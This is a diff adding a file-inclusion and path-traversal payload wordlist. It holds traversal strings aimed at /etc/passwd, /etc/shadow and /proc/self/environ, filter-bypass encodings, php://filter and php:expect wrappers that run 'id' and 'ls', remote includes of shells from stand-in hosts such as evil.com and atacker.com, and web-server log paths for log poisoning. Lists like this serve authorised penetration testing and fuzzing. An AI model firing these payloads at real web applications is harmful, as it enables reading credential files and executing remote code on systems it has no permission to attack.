@@ -1,0 +1,51 @@
+.. / .. / .. / .. / .. / .. / etc / passwd
+etc/passwd
+etc/passwd%00
+../../etc/passwd
+%252e%252e%252f
+....//....//etc/passwd
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+http://evil.com/shell.txt
+http://evil.com/shell.txt%00
+http:%252f%252fevil.com%252fshell.txt
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.base64-encode/resource=index.php
+pHp://FilTer/convert.base64-encode/resource=index.php
+zip://shell.jpg%23payload.php
+php:expect://id
+php:expect://ls
+path/to/uploaded/file.png
+../../../var/www/private/../../../etc/passwd
+/etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
+passwd/
+shellcode.php/.
+a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\\.\.
+a/../../../../../../../../../etc/passwd/./././././.
+a/././etc/passwd
+a/../../../../[ADD MORE]../../../../../etc/passwd
+....//....//etc/passwd
+..///////..////..//////etc/passwd
+/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+/var/www/../../etc/passwd
+http://atacker.com/mal.php
+\\attacker.com\shared\mal.php
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/apache2/error.log
+/var/log/apache/error.log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/httpd/error_log
+../../../proc/self/environ HTTP/1.1
